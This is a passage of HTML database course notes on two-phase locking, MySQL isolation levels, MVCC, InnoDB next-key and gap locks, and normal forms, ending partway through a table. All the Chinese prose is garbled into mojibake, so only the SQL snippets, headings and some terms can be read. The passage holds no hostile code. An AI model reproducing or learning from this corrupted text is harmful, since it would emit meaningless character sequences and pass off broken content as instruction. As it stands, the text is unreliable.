<p>å¯ä¸²è¡ŒåŒ–è°ƒåº¦æ˜¯æŒ‡ï¼Œé€šè¿‡å¹¶å‘æ§åˆ¶ï¼Œä½¿å¾—å¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡ç»“æœä¸æŸä¸ªä¸²è¡Œæ‰§è¡Œçš„äº‹åŠ¡ç»“æœç›¸åŒã€‚</p>
<p>äº‹åŠ¡éµå¾ªä¸¤æ®µé”åè®®æ˜¯ä¿è¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦çš„å……åˆ†æ¡ä»¶ã€‚ä¾‹å¦‚ä»¥ä¸‹æ“ä½œæ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œå®ƒæ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚</p>
<div><pre><code>lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B)
</code></pre></div><p>ä½†ä¸æ˜¯å¿…è¦æ¡ä»¶ï¼Œä¾‹å¦‚ä»¥ä¸‹æ“ä½œä¸æ»¡è¶³ä¸¤æ®µé”åè®®ï¼Œä½†æ˜¯å®ƒè¿˜æ˜¯å¯ä¸²è¡ŒåŒ–è°ƒåº¦ã€‚</p>
<div><pre><code>lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C)
</code></pre></div><h2 id="mysql-éšå¼ä¸æ˜¾ç¤ºé”å®š" tabindex="-1"> MySQL éšå¼ä¸æ˜¾ç¤ºé”å®š</h2>
<p>MySQL çš„ InnoDB å­˜å‚¨å¼•æ“é‡‡ç”¨ä¸¤æ®µé”åè®®ï¼Œä¼šæ ¹æ®éš”ç¦»çº§åˆ«åœ¨éœ€è¦çš„æ—¶å€™è‡ªåŠ¨åŠ é”ï¼Œå¹¶ä¸”æ‰€æœ‰çš„é”éƒ½æ˜¯åœ¨åŒä¸€æ—¶åˆ»è¢«é‡Šæ”¾ï¼Œè¿™è¢«ç§°ä¸ºéšå¼é”å®šã€‚</p>
<p>InnoDB ä¹Ÿå¯ä»¥ä½¿ç”¨ç‰¹å®šçš„è¯­å¥è¿›è¡Œæ˜¾ç¤ºé”å®šï¼š</p>
<div><pre><code><span>SELECT</span> <span>.</span><span>.</span><span>.</span> <span>LOCK</span> <span>In</span> <span>SHARE</span> <span>MODE</span><span>;</span>
<span>SELECT</span> <span>.</span><span>.</span><span>.</span> <span>FOR</span> <span>UPDATE</span><span>;</span>
</code></pre></div><h1 id="å››ã€éš”ç¦»çº§åˆ«" tabindex="-1"> å››ã€éš”ç¦»çº§åˆ«</h1>
<h2 id="æœªæäº¤è¯»-read-uncommitted" tabindex="-1"> æœªæäº¤è¯»ï¼ˆREAD UNCOMMITTEDï¼‰</h2>
<p>äº‹åŠ¡ä¸­çš„ä¿®æ”¹ï¼Œå³ä½¿æ²¡æœ‰æäº¤ï¼Œå¯¹å…¶å®ƒäº‹åŠ¡ä¹Ÿæ˜¯å¯è§çš„ã€‚</p>
<h2 id="æäº¤è¯»-read-committed" tabindex="-1"> æäº¤è¯»ï¼ˆREAD COMMITTEDï¼‰</h2>
<p>ä¸€ä¸ªäº‹åŠ¡åªèƒ½è¯»å–å·²ç»æäº¤çš„äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹ã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªäº‹åŠ¡æ‰€åšçš„ä¿®æ”¹åœ¨æäº¤ä¹‹å‰å¯¹å…¶å®ƒäº‹åŠ¡æ˜¯ä¸å¯è§çš„ã€‚</p>
<h2 id="å¯é‡å¤è¯»-repeatable-read" tabindex="-1"> å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰</h2>
<p>ä¿è¯åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¤šæ¬¡è¯»å–åŒæ ·æ•°æ®çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</p>
<h2 id="å¯ä¸²è¡ŒåŒ–-serializable" tabindex="-1"> å¯ä¸²è¡ŒåŒ–ï¼ˆSERIALIZABLEï¼‰</h2>
<p>å¼ºåˆ¶äº‹åŠ¡ä¸²è¡Œæ‰§è¡Œã€‚</p>
<p>éœ€è¦åŠ é”å®ç°ï¼Œè€Œå…¶å®ƒéš”ç¦»çº§åˆ«é€šå¸¸ä¸éœ€è¦ã€‚</p>
<hr>
<table>
<thead>
<tr>
<th style="text-align:center">éš”ç¦»çº§åˆ«</th>
<th style="text-align:center">è„è¯»</th>
<th style="text-align:center">ä¸å¯é‡å¤è¯»</th>
<th style="text-align:center">å¹»å½±è¯»</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">æœªæäº¤è¯»</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
</tr>
<tr>
<td style="text-align:center">æäº¤è¯»</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
<td style="text-align:center">âˆš</td>
</tr>
<tr>
<td style="text-align:center">å¯é‡å¤è¯»</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">âˆš</td>
</tr>
<tr>
<td style="text-align:center">å¯ä¸²è¡ŒåŒ–</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
<td style="text-align:center">Ã—</td>
</tr>
</tbody>
</table>
<h1 id="äº”ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶" tabindex="-1"> äº”ã€å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶</h1>
<p>å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMulti-Version Concurrency Control, MVCCï¼‰æ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“å®ç°éš”ç¦»çº§åˆ«çš„ä¸€ç§å…·ä½“æ–¹å¼ï¼Œç”¨äºå®ç°æäº¤è¯»å’Œå¯é‡å¤è¯»è¿™ä¸¤ç§éš”ç¦»çº§åˆ«ã€‚è€Œæœªæäº¤è¯»éš”ç¦»çº§åˆ«æ€»æ˜¯è¯»å–æœ€æ–°çš„æ•°æ®è¡Œï¼Œæ— éœ€ä½¿ç”¨ MVCCã€‚å¯ä¸²è¡ŒåŒ–éš”ç¦»çº§åˆ«éœ€è¦å¯¹æ‰€æœ‰è¯»å–çš„è¡Œéƒ½åŠ é”ï¼Œå•çº¯ä½¿ç”¨ MVCC æ— æ³•å®ç°ã€‚</p>
<h2 id="ç‰ˆæœ¬å·" tabindex="-1"> ç‰ˆæœ¬å·</h2>
<ul>
<li>ç³»ç»Ÿç‰ˆæœ¬å·ï¼šæ˜¯ä¸€ä¸ªé€’å¢çš„æ•°å­—ï¼Œæ¯å¼€å§‹ä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œç³»ç»Ÿç‰ˆæœ¬å·å°±ä¼šè‡ªåŠ¨é€’å¢ã€‚</li>
<li>äº‹åŠ¡ç‰ˆæœ¬å·ï¼šäº‹åŠ¡å¼€å§‹æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ã€‚</li>
</ul>
<h2 id="éšè—çš„åˆ—" tabindex="-1"> éšè—çš„åˆ—</h2>
<p>MVCC åœ¨æ¯è¡Œè®°å½•åé¢éƒ½ä¿å­˜ç€ä¸¤ä¸ªéšè—çš„åˆ—ï¼Œç”¨æ¥å­˜å‚¨ä¸¤ä¸ªç‰ˆæœ¬å·ï¼š</p>
<ul>
<li>åˆ›å»ºç‰ˆæœ¬å·ï¼šæŒ‡ç¤ºåˆ›å»ºä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼›</li>
<li>åˆ é™¤ç‰ˆæœ¬å·ï¼šå¦‚æœè¯¥å¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¤§äºå½“å‰äº‹åŠ¡ç‰ˆæœ¬å·è¡¨ç¤ºè¯¥å¿«ç…§æœ‰æ•ˆï¼Œå¦åˆ™è¡¨ç¤ºè¯¥å¿«ç…§å·²ç»è¢«åˆ é™¤äº†ã€‚</li>
</ul>
<h2 id="undo-æ—¥å¿—" tabindex="-1"> Undo æ—¥å¿—</h2>
<p>MVCC ä½¿ç”¨åˆ°çš„å¿«ç…§å­˜å‚¨åœ¨ Undo æ—¥å¿—ä¸­ï¼Œè¯¥æ—¥å¿—é€šè¿‡å›æ»šæŒ‡é’ˆæŠŠä¸€ä¸ªæ•°æ®è¡Œï¼ˆRecordï¼‰çš„æ‰€æœ‰å¿«ç…§è¿æ¥èµ·æ¥ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e41405a8-7c05-4f70-8092-e961e28d3112.jpg" width="300px"> </div><br>
<h3 id="insert-undo-log" tabindex="-1"> insert undo log</h3>
<p>ä»£è¡¨äº‹åŠ¡åœ¨insertæ–°è®°å½•æ—¶äº§ç”Ÿçš„undo log, åªåœ¨äº‹åŠ¡å›æ»šæ—¶éœ€è¦ï¼Œå¹¶ä¸”åœ¨äº‹åŠ¡æäº¤åå¯ä»¥è¢«ç«‹å³ä¸¢å¼ƒ</p>
<h3 id="update-undo-log" tabindex="-1"> update undo log</h3>
<p>äº‹åŠ¡åœ¨è¿›è¡Œupdateæˆ–deleteæ—¶äº§ç”Ÿçš„undo log; ä¸ä»…åœ¨äº‹åŠ¡å›æ»šæ—¶éœ€è¦ï¼Œåœ¨å¿«ç…§è¯»æ—¶ä¹Ÿéœ€è¦ï¼›æ‰€ä»¥ä¸èƒ½éšä¾¿åˆ é™¤ï¼Œåªæœ‰åœ¨å¿«é€Ÿè¯»æˆ–äº‹åŠ¡å›æ»šä¸æ¶‰åŠè¯¥æ—¥å¿—æ—¶ï¼Œå¯¹åº”çš„æ—¥å¿—æ‰ä¼šè¢«purgeçº¿ç¨‹ç»Ÿä¸€æ¸…é™¤</p>
<h2 id="å®ç°è¿‡ç¨‹" tabindex="-1"> å®ç°è¿‡ç¨‹</h2>
<p>ä»¥ä¸‹å®ç°è¿‡ç¨‹é’ˆå¯¹å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ã€‚</p>
<p>å½“å¼€å§‹ä¸€ä¸ªäº‹åŠ¡æ—¶ï¼Œè¯¥äº‹åŠ¡çš„ç‰ˆæœ¬å·è‚¯å®šå¤§äºå½“å‰æ‰€æœ‰æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ï¼Œç†è§£è¿™ä¸€ç‚¹å¾ˆå…³é”®ã€‚æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·æ˜¯åˆ›å»ºæ•°æ®è¡Œå¿«ç…§æ—¶çš„ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œç³»ç»Ÿç‰ˆæœ¬å·éšç€åˆ›å»ºäº‹åŠ¡è€Œé€’å¢ï¼Œå› æ­¤æ–°åˆ›å»ºä¸€ä¸ªäº‹åŠ¡æ—¶ï¼Œè¿™ä¸ªäº‹åŠ¡çš„ç³»ç»Ÿç‰ˆæœ¬å·æ¯”ä¹‹å‰çš„ç³»ç»Ÿç‰ˆæœ¬å·éƒ½å¤§ï¼Œä¹Ÿå°±æ˜¯æ¯”æ‰€æœ‰æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·éƒ½å¤§ã€‚</p>
<h3 id="_1-select" tabindex="-1"> 1. SELECT</h3>
<p>å¤šä¸ªäº‹åŠ¡å¿…é¡»è¯»å–åˆ°åŒä¸€ä¸ªæ•°æ®è¡Œçš„å¿«ç…§ï¼Œå¹¶ä¸”è¿™ä¸ªå¿«ç…§æ˜¯è·ç¦»ç°åœ¨æœ€è¿‘çš„ä¸€ä¸ªæœ‰æ•ˆå¿«ç…§ã€‚ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæœ‰ä¸€ä¸ªäº‹åŠ¡æ­£åœ¨ä¿®æ”¹è¯¥æ•°æ®è¡Œï¼Œé‚£ä¹ˆå®ƒå¯ä»¥è¯»å–äº‹åŠ¡æœ¬èº«æ‰€åšçš„ä¿®æ”¹ï¼Œè€Œä¸ç”¨å’Œå…¶å®ƒäº‹åŠ¡çš„è¯»å–ç»“æœä¸€è‡´ã€‚</p>
<p>æŠŠæ²¡æœ‰å¯¹ä¸€ä¸ªæ•°æ®è¡Œåšä¿®æ”¹çš„äº‹åŠ¡ç§°ä¸º Tï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·å¿…é¡»å°äºç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå¤§äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å…¶å®ƒäº‹åŠ¡çš„æœ€æ–°ä¿®æ”¹ï¼Œå› æ­¤ä¸èƒ½å»è¯»å–å®ƒã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒT æ‰€è¦è¯»å–çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·å¿…é¡»æ˜¯æœªå®šä¹‰æˆ–è€…å¤§äº T çš„ç‰ˆæœ¬å·ï¼Œå› ä¸ºå¦‚æœå°äºç­‰äº T çš„ç‰ˆæœ¬å·ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¯¥æ•°æ®è¡Œå¿«ç…§æ˜¯å·²ç»è¢«åˆ é™¤çš„ï¼Œä¸åº”è¯¥å»è¯»å–å®ƒã€‚</p>
<h3 id="_2-insert" tabindex="-1"> 2. INSERT</h3>
<p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ã€‚</p>
<h3 id="_3-delete" tabindex="-1"> 3. DELETE</h3>
<p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ã€‚</p>
<h3 id="_4-update" tabindex="-1"> 4. UPDATE</h3>
<p>å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°å‰çš„æ•°æ®è¡Œå¿«ç…§çš„åˆ é™¤ç‰ˆæœ¬å·ï¼Œå¹¶å°†å½“å‰ç³»ç»Ÿç‰ˆæœ¬å·ä½œä¸ºæ›´æ–°åçš„æ•°æ®è¡Œå¿«ç…§çš„åˆ›å»ºç‰ˆæœ¬å·ã€‚å¯ä»¥ç†è§£ä¸ºå…ˆæ‰§è¡Œ DELETE åæ‰§è¡Œ INSERTã€‚</p>
<h2 id="å¿«ç…§è¯»ä¸å½“å‰è¯»" tabindex="-1"> å¿«ç…§è¯»ä¸å½“å‰è¯»</h2>
<h3 id="_1-å¿«ç…§è¯»" tabindex="-1"> 1. å¿«ç…§è¯»</h3>
<p>ä½¿ç”¨ MVCC è¯»å–çš„æ˜¯å¿«ç…§ä¸­çš„æ•°æ®ï¼Œè¿™æ ·å¯ä»¥å‡å°‘åŠ é”æ‰€å¸¦æ¥çš„å¼€é”€ã€‚</p>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>.</span><span>.</span><span>.</span><span>;</span>
</code></pre></div><h3 id="_2-å½“å‰è¯»" tabindex="-1"> 2. å½“å‰è¯»</h3>
<p>è¯»å–çš„æ˜¯æœ€æ–°çš„æ•°æ®ï¼Œéœ€è¦åŠ é”ã€‚ä»¥ä¸‹ç¬¬ä¸€ä¸ªè¯­å¥éœ€è¦åŠ  S é”ï¼Œå…¶å®ƒéƒ½éœ€è¦åŠ  X é”ã€‚</p>
<div><pre><code><span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>where</span> ? <span>lock</span> <span>in</span> <span>share</span> <span>mode</span><span>;</span>
<span>select</span> <span>*</span> <span>from</span> <span>table</span> <span>where</span> ? <span>for</span> <span>update</span><span>;</span>
<span>insert</span><span>;</span>
<span>update</span><span>;</span>
<span>delete</span><span>;</span>
</code></pre></div><h1 id="å…­ã€next-key-locks" tabindex="-1"> å…­ã€Next-Key Locks</h1>
<p>Next-Key Locks æ˜¯ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“çš„ä¸€ç§é”å®ç°ã€‚</p>
<p>MVCC ä¸èƒ½è§£å†³å¹»å½±è¯»é—®é¢˜ï¼ŒNext-Key Locks å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œå­˜åœ¨çš„ã€‚åœ¨å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰éš”ç¦»çº§åˆ«ä¸‹ï¼Œä½¿ç”¨ MVCC + Next-Key Locks å¯ä»¥è§£å†³å¹»è¯»é—®é¢˜ã€‚</p>
<h2 id="record-locks" tabindex="-1"> Record Locks</h2>
<p>é”å®šä¸€ä¸ªè®°å½•ä¸Šçš„ç´¢å¼•ï¼Œè€Œä¸æ˜¯è®°å½•æœ¬èº«ã€‚</p>
<p>å¦‚æœè¡¨æ²¡æœ‰è®¾ç½®ç´¢å¼•ï¼ŒInnoDB ä¼šè‡ªåŠ¨åœ¨ä¸»é”®ä¸Šåˆ›å»ºéšè—çš„èšç°‡ç´¢å¼•ï¼Œå› æ­¤ Record Locks ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚</p>
<h2 id="gap-locks" tabindex="-1"> Gap Locks</h2>
<p>é”å®šç´¢å¼•ä¹‹é—´çš„é—´éš™ï¼Œä½†æ˜¯ä¸åŒ…å«ç´¢å¼•æœ¬èº«ã€‚ä¾‹å¦‚å½“ä¸€ä¸ªäº‹åŠ¡æ‰§è¡Œä»¥ä¸‹è¯­å¥ï¼Œå…¶å®ƒäº‹åŠ¡å°±ä¸èƒ½åœ¨ t.c ä¸­æ’å…¥ 15ã€‚</p>
<div><pre><code><span>SELECT</span> c <span>FROM</span> t <span>WHERE</span> c <span>BETWEEN</span> <span>10</span> <span>and</span> <span>20</span> <span>FOR</span> <span>UPDATE</span><span>;</span>
</code></pre></div><h2 id="next-key-locks" tabindex="-1"> Next-Key Locks</h2>
<p>å®ƒæ˜¯ Record Locks å’Œ Gap Locks çš„ç»“åˆï¼Œä¸ä»…é”å®šä¸€ä¸ªè®°å½•ä¸Šçš„ç´¢å¼•ï¼Œä¹Ÿé”å®šç´¢å¼•ä¹‹é—´çš„é—´éš™ã€‚ä¾‹å¦‚ä¸€ä¸ªç´¢å¼•åŒ…å«ä»¥ä¸‹å€¼ï¼š10, 11, 13, and 20ï¼Œé‚£ä¹ˆå°±éœ€è¦é”å®šä»¥ä¸‹åŒºé—´ï¼š</p>
<div><pre><code><span>(</span><span>-</span>âˆ<span>,</span> <span>10</span><span>]</span>
<span>(</span><span>10</span><span>,</span> <span>11</span><span>]</span>
<span>(</span><span>11</span><span>,</span> <span>13</span><span>]</span>
<span>(</span><span>13</span><span>,</span> <span>20</span><span>]</span>
<span>(</span><span>20</span><span>,</span> <span>+</span>âˆ<span>)</span>
</code></pre></div><ol>
<li>innodbå¯¹äºè¡Œçš„æŸ¥è¯¢ä½¿ç”¨next-key lock</li>
<li>Next-locking keyingä¸ºäº†è§£å†³Phantom Problemå¹»è¯»é—®é¢˜</li>
<li>å½“æŸ¥è¯¢çš„ç´¢å¼•å«æœ‰å”¯ä¸€å±æ€§æ—¶ï¼Œå°†next-key locké™çº§ä¸ºrecord key</li>
<li>Gapé”è®¾è®¡çš„ç›®çš„æ˜¯ä¸ºäº†é˜»æ­¢å¤šä¸ªäº‹åŠ¡å°†è®°å½•æ’å…¥åˆ°åŒä¸€èŒƒå›´å†…ï¼Œè€Œè¿™ä¼šå¯¼è‡´å¹»è¯»é—®é¢˜çš„äº§ç”Ÿ</li>
<li>æœ‰ä¸¤ç§æ–¹å¼æ˜¾å¼å…³é—­gapé”ï¼šï¼ˆé™¤äº†å¤–é”®çº¦æŸå’Œå”¯ä¸€æ€§æ£€æŸ¥å¤–ï¼Œå…¶ä½™æƒ…å†µä»…ä½¿ç”¨record lockï¼‰<br>
a. å°†äº‹åŠ¡éš”ç¦»çº§åˆ«è®¾ç½®ä¸ºRC
b. å°†å‚æ•°innodb_locks_unsafe_for_binlogè®¾ç½®ä¸º1</li>
</ol>
<h1 id="ä¸ƒã€å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®º" tabindex="-1"> ä¸ƒã€å…³ç³»æ•°æ®åº“è®¾è®¡ç†è®º</h1>
<h2 id="å‡½æ•°ä¾èµ–" tabindex="-1"> å‡½æ•°ä¾èµ–</h2>
<p>è®° A-&gt;B è¡¨ç¤º A å‡½æ•°å†³å®š Bï¼Œä¹Ÿå¯ä»¥è¯´ B å‡½æ•°ä¾èµ–äº Aã€‚</p>
<p>å¦‚æœ {A1ï¼ŒA2ï¼Œ... ï¼ŒAn} æ˜¯å…³ç³»çš„ä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§çš„é›†åˆï¼Œè¯¥é›†åˆå‡½æ•°å†³å®šäº†å…³ç³»çš„å…¶å®ƒæ‰€æœ‰å±æ€§å¹¶ä¸”æ˜¯æœ€å°çš„ï¼Œé‚£ä¹ˆè¯¥é›†åˆå°±ç§°ä¸ºé”®ç ã€‚</p>
<p>å¯¹äº A-&gt;Bï¼Œå¦‚æœèƒ½æ‰¾åˆ° A çš„çœŸå­é›† A'ï¼Œä½¿å¾— A'-&gt; Bï¼Œé‚£ä¹ˆ A-&gt;B å°±æ˜¯éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œå¦åˆ™å°±æ˜¯å®Œå…¨å‡½æ•°ä¾èµ–ã€‚</p>
<p>å¯¹äº A-&gt;Bï¼ŒB-&gt;Cï¼Œåˆ™ A-&gt;C æ˜¯ä¸€ä¸ªä¼ é€’å‡½æ•°ä¾èµ–ã€‚</p>
<h2 id="å¼‚å¸¸" tabindex="-1"> å¼‚å¸¸</h2>
<p>ä»¥ä¸‹çš„å­¦ç”Ÿè¯¾ç¨‹å…³ç³»çš„å‡½æ•°ä¾èµ–ä¸º {Sno, Cname} -&gt; {Sname, Sdept, Mname, Grade}ï¼Œé”®ç ä¸º {Sno, Cname}ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®å®šå­¦ç”Ÿå’Œè¯¾ç¨‹ä¹‹åï¼Œå°±èƒ½ç¡®å®šå…¶å®ƒä¿¡æ¯ã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">å­¦ç”Ÿ-1</td>
<td style="text-align:center">å­¦é™¢-1</td>
<td style="text-align:center">é™¢é•¿-1</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">å­¦ç”Ÿ-3</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>ä¸ç¬¦åˆèŒƒå¼çš„å…³ç³»ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šå¼‚å¸¸ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å››ç§å¼‚å¸¸ï¼š</p>
<ul>
<li>å†—ä½™æ•°æ®ï¼šä¾‹å¦‚ <code>å­¦ç”Ÿ-2</code> å‡ºç°äº†ä¸¤æ¬¡ã€‚</li>
<li>ä¿®æ”¹å¼‚å¸¸ï¼šä¿®æ”¹äº†ä¸€ä¸ªè®°å½•ä¸­çš„ä¿¡æ¯ï¼Œä½†æ˜¯å¦ä¸€ä¸ªè®°å½•ä¸­ç›¸åŒçš„ä¿¡æ¯å´æ²¡æœ‰è¢«ä¿®æ”¹ã€‚</li>
<li>åˆ é™¤å¼‚å¸¸ï¼šåˆ é™¤ä¸€ä¸ªä¿¡æ¯ï¼Œé‚£ä¹ˆä¹Ÿä¼šä¸¢å¤±å…¶å®ƒä¿¡æ¯ã€‚ä¾‹å¦‚åˆ é™¤äº† <code>è¯¾ç¨‹-1</code> éœ€è¦åˆ é™¤ç¬¬ä¸€è¡Œå’Œç¬¬ä¸‰è¡Œï¼Œé‚£ä¹ˆ <code>å­¦ç”Ÿ-1</code> çš„ä¿¡æ¯å°±ä¼šä¸¢å¤±ã€‚</li>
<li>æ’å…¥å¼‚å¸¸ï¼šä¾‹å¦‚æƒ³è¦æ’å…¥ä¸€ä¸ªå­¦ç”Ÿçš„ä¿¡æ¯ï¼Œå¦‚æœè¿™ä¸ªå­¦ç”Ÿè¿˜æ²¡é€‰è¯¾ï¼Œé‚£ä¹ˆå°±æ— æ³•æ’å…¥ã€‚</li>
</ul>
<h2 id="èŒƒå¼" tabindex="-1"> èŒƒå¼</h2>
<p>èŒƒå¼ç†è®ºæ˜¯ä¸ºäº†è§£å†³ä»¥ä¸Šæåˆ°å››ç§å¼‚å¸¸ã€‚</p>
<p>é«˜çº§åˆ«èŒƒå¼çš„ä¾èµ–äºä½çº§åˆ«çš„èŒƒå¼ï¼Œ1NF æ˜¯æœ€ä½çº§åˆ«çš„èŒƒå¼ã€‚</p>
<h3 id="_1-ç¬¬ä¸€èŒƒå¼-1nf" tabindex="-1"> 1. ç¬¬ä¸€èŒƒå¼ (1NF)</h3>
<p>å±æ€§ä¸å¯åˆ†ã€‚</p>
<h3 id="_2-ç¬¬äºŒèŒƒå¼-2nf" tabindex="-1"> 2. ç¬¬äºŒèŒƒå¼ (2NF)</h3>
<p>æ¯ä¸ªéä¸»å±æ€§å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ã€‚</p>
<p>å¯ä»¥é€šè¿‡åˆ†è§£æ¥æ»¡è¶³ã€‚</p>
<p><strong>åˆ†è§£å‰</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
<th style="text-align:center">Cname</th>
<th style="text-align:center">Grade</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">å­¦ç”Ÿ-1</td>
<td style="text-align:center">å­¦é™¢-1</td>
<td style="text-align:center">é™¢é•¿-1</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">90</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">80</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">å­¦ç”Ÿ-2</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-1</td>
<td style="text-align:center">100</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">å­¦ç”Ÿ-3</td>
<td style="text-align:center">å­¦é™¢-2</td>
<td style="text-align:center">é™¢é•¿-2</td>
<td style="text-align:center">è¯¾ç¨‹-2</td>
<td style="text-align:center">95</td>
</tr>
</tbody>
</table>
<p>ä»¥ä¸Šå­¦ç”Ÿè¯¾ç¨‹å…³ç³»ä¸­ï¼Œ{Sno, Cname} ä¸ºé”®ç ï¼Œæœ‰å¦‚ä¸‹å‡½æ•°ä¾èµ–ï¼š</p>
<ul>
<li>Sno -&gt; Sname, Sdept</li>
<li>Sdept -&gt; Mname</li>
<li>Sno, Cname-&gt; Grade</li>
</ul>
<p>Grade å®Œå…¨å‡½æ•°ä¾èµ–äºé”®ç ï¼Œå®ƒæ²¡æœ‰ä»»ä½•å†—ä½™æ•°æ®ï¼Œæ¯ä¸ªå­¦ç”Ÿçš„æ¯é—¨è¯¾éƒ½æœ‰ç‰¹å®šçš„æˆç»©ã€‚</p>
<p>Sname, Sdept å’Œ Mname éƒ½éƒ¨åˆ†ä¾èµ–äºé”®ç ï¼Œå½“ä¸€ä¸ªå­¦ç”Ÿé€‰ä¿®äº†å¤šé—¨è¯¾æ—¶ï¼Œè¿™äº›æ•°æ®å°±ä¼šå‡ºç°å¤šæ¬¡ï¼Œé€ æˆå¤§é‡å†—ä½™æ•°æ®ã€‚</p>
<p><strong>åˆ†è§£å</strong></p>
<p>å…³ç³»-1</p>
<table>
<thead>
<tr>
<th style="text-align:center">Sno</th>
<th style="text-align:center">Sname</th>
<th style="text-align:center">Sdept</th>
<th style="text-align:center">Mname</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">å­¦ç”Ÿ-1</td>
<td style="text-align:center">å­¦é™¢-1</td>
